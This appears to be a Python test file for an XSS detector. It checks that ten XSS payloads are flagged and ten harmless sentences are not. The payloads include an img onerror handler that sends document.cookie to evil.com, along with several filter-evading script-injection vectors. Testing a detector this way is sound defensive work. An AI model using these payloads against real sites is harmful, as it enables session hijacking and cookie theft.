# tests/test_predict.py
from src.predict import predict_xss


def test_xss_payloads():
    xss_cases = [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=fetch('http://evil.com/'+document.cookie)>",
        "<svg/onload=alert`1`>",
        "<body onpageshow=alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<a href=jav&#x09;ascript:alert(1)>x</a>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<object data=javascript:alert(1)>",
    ]
    for text in xss_cases:
        r = predict_xss(text)
        assert r["label"] == "xss", f"漏报 XSS: {text} -> {r}"


def test_normal_texts():
    normal_cases = [
        "Hello, how are you today?",
        "Please confirm your email address.",
        "The script was written by a famous author.",
        "She sent an alert to the security team.",
        "We discussed JavaScript performance in the meeting.",
        "The document describes the installation steps.",
        "This page uses cookies for authentication.",
        "The onclick event fires when the user clicks.",
        "He evaluated the results carefully.",
        "Our team uses eval only in test environments.",
    ]
    for text in normal_cases:
        r = predict_xss(text)
        assert r["label"] == "normal", f"误报正常: {text} -> {r}"


if __name__ == "__main__":
    test_xss_payloads()
    test_normal_texts()
    print("test_predict.py 全部通过")